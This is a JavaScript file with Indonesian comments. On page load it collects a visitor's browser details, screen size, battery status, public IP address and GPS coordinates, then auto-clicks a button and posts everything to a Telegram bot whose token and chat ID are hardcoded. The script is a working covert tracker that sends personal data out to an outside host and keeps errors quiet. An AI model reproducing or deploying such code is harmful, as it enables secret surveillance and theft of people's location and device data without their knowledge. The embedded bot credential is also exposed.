let level;
let charging;
let chargingTime;
let dischargingTime;
let userLatitude;
let userLongitude;
let ipper;
let response;
const deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
const screenWidth = window.screen.width;
const screenHeight = window.screen.height;
const browserName = navigator.userAgent;
const browserVersion = navigator.appVersion;
const BOT_TOKEN = '6940826614:AAF-aZ-87ar55WzKoJtDb5hP27Dt60mQr5w';
    const CHAT_ID = '804116558';

console.log(`Nama Peramban: ${browserName}, Versi: ${browserVersion}`);
console.log(`Lebar Layar: ${screenWidth}px, Tinggi Layar: ${screenHeight}px`);
console.log(`Jenis Perangkat: ${deviceType}`);

// Pastikan browser mendukung API Baterai
if ('getBattery' in navigator) {
    navigator.getBattery().then(function (battery) {
        // Mendapatkan informasi baterai
        level = battery.level * 100; // Level baterai dalam persen
        charging = battery.charging; // Apakah baterai sedang diisi (true/false)
        chargingTime = battery.chargingTime; // Waktu yang diperlukan untuk mengisi baterai (detik), -1 jika tidak sedang diisi
        dischargingTime  = battery.dischargingTime; // Waktu yang diperkirakan baterai dapat digunakan (detik), -1 jika baterai sedang diisi

        // Menampilkan informasi baterai
        console.log(`Level Baterai: ${level}%`);
        console.log(`Sedang diisi: ${charging ? 'Ya' : 'Tidak'}`);
        console.log(`Waktu Mengisi: ${chargingTime} detik`);
        console.log(`Waktu Tersisa: ${dischargingTime} detik`);
    });
} else {
    console.log('Browser tidak mendukung API Baterai.');
}


async function sendMessage() {
    
const message = `
Nama Peramban: ${browserName}
Versi:  ${browserVersion}
================================
IP Perangkat: ${ipper}
Perangkat: ${deviceType}
Resolusi Layar: ${screenWidth} X ${screenHeight}
Level Baterai: 🔋${level}% 
Sedang diisi: ${charging ? '🔌' : '❌'}
Waktu Mengisi: ${chargingTime} detik
Waktu Tersisa: ${dischargingTime} detik
================================
Latitude :  ${userLatitude}
Longitude : ${userLongitude}
`;

    const resultMessageElement = document.getElementById('resultMessage');

    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        });

        const responseData = await response.json();

        if (responseData.ok) {
            resultMessageElement.textContent = 'Pesan otomatis berhasil dikirim!';
        } else {
            resultMessageElement.textContent = 'Gagal mengirim pesan otomatis. Coba lagi nanti.';
        }
    } catch (error) {
        // console.error('Error sending automatic message:', error.message);
        // resultMessageElement.textContent = 'Terjadi kesalahan saat mengirim pesan otomatis. Coba lagi nanti.';
    }
}

 // Panggil fungsi getUserLocation secara otomatis saat halaman dimuat
 document.addEventListener('DOMContentLoaded', function() {
    getUserLocation();
});

function getUserLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                userLatitude = position.coords.latitude;
                userLongitude = position.coords.longitude;
                // Tampilkan di konsol log
                console.log('Latitude:', userLatitude);
                console.log('Longitude:', userLongitude);
            }
        );
    } else {
        const locationResult = document.getElementById('locationResult');
        locationResult.textContent = 'Browser tidak mendukung Geolocation API.';
    }
}


document.addEventListener('DOMContentLoaded', function() {
    checkLocationPermission();
});

function checkLocationPermission() {
    // Mengecek izin lokasi
    navigator.geolocation.getCurrentPosition(
        function(position) {
            // Izin lokasi diberikan, maka kita dapat memanggil fungsi untuk mengklik tombol
            console.log('Izin lokasi diberikan.');
            buttonClick();
        },
        function(error) {
            // Izin lokasi tidak diberikan
            console.error('Izin lokasi tidak diberikan:');
            buttonClick();
        }
    );
}

function buttonClick() {
    // Temukan elemen tombol berdasarkan ID
    const myButton = document.getElementById('myButton');

    // Klik tombol secara otomatis
    myButton.click();
}


// Fungsi untuk mendapatkan alamat IP menggunakan XMLHttpRequest
function getIPAddress() {
    const xhr = new XMLHttpRequest();
  
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          response = JSON.parse(xhr.responseText);
          ipper = response.ip;
          console.log(`Alamat IP perangkat: ${ipper}`);
        } else {
          console.error('Terjadi kesalahan:', xhr.status);
        }
      }
    };
  
    xhr.open('GET', 'https://api64.ipify.org?format=json', true);
    xhr.send();
  }
  
  getIPAddress();

  
  

